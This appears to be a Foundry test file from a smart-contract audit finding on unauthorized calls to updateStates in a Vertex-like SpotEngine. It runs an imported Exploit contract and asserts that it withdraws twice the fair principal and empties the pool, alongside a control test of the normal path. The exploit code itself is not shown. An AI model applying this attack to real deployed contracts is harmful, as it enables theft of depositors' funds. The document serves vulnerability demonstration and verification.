// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, SpotEngine, UNIT} from "./48377-unauthorized-access-to-updatestates-ottersec-none-vertex-pro.sol";

contract Finding48377Test is Test {
    function test_arbitrary_dt_withdraws_the_other_deposit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.taken(), UNIT * 2, "withdrew 2000");
        assertEq(e.fair(), UNIT, "fair principal");
        assertEq(e.cashLeft(), 0, "pool empty");
        assertEq(e.lenderShares(), UNIT, "lender still owed");
        console2.log("taken", e.taken());
        console2.log("fair", e.fair());
        console2.log("lender shares", e.lenderShares());
    }

    function test_control_endpoint_dt_zero_pays_principal() public {
        SpotEngine engine = new SpotEngine(address(this));
        engine.seed(address(0xB0B), UNIT);
        engine.seed(address(this), UNIT);
        engine.updateStatesAsEndpoint(0);

        uint256 got = engine.withdraw();
        assertEq(got, UNIT, "principal only");
        assertEq(engine.usdc().balanceOf(address(engine)), UNIT, "lender cash remains");
        assertEq(engine.index(), 1e18, "index unchanged");
        console2.log("control withdraw", got);
        console2.log("control cash", engine.usdc().balanceOf(address(engine)));
    }
}
